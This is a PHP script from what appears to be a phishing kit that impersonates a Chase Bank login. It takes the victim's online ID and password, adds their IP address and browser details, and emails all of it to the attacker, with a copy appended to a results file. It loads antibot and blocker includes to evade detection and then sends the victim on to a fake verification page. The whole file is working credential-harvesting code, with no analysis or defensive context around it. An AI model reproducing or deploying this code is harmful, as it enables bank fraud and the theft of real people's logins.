<?php
$zabi = getenv("REMOTE_ADDR");
include('../email.php');
include '../antibots.php';
include '../bt.php';
include "../blocker.php";
$message .= "--++-----[ $$ Dr.Don  $$ ]-----++--\n";
$message .= "--------------  LOGIN  -------------\n";
$message .= "Onlineid : ".$_POST['1']."\n";
$message .= "Password : ".$_POST['2']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- By Dr.Don  ----------------------\n";
$cc = $_POST['ccn'];
$subject = "CHASE BANK LOGGN [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Dr.Don <contact>\r\n";
mail($email,$subject,$message,$headers);
mail($blockeduse,$subject,$message,$headers);

    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);
header("Location: ../verification.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>